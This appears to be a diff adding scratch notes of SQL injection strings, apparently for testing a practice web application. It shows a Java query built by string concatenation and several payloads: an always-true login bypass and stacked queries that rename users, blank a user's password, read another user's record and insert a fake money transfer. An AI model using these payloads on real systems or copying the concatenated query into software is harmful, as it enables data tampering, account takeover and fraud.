@@ -1,0 +1,15 @@
+"SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'"
+
+"SELECT * FROM accounts WHERE custID='' or '1'='1'"
+
+
+test' or '1'='1
+
+testLN' --; UPDATE user SET first_name='arimaman';
+
+
+UPDATE user SET first_name='', last_name='', password='' WHERE email='joachim@joachim.com';
+
+testLN3'; SELECT * FROM user WHERE email='halla@data.no'; --
+
+testLN4'; INSERT INTO transaction (from_email, to_email, text, amount) VALUES ('halla@data.no', 'joachim@joachim.com', 'balle bro mongo?', 123); --
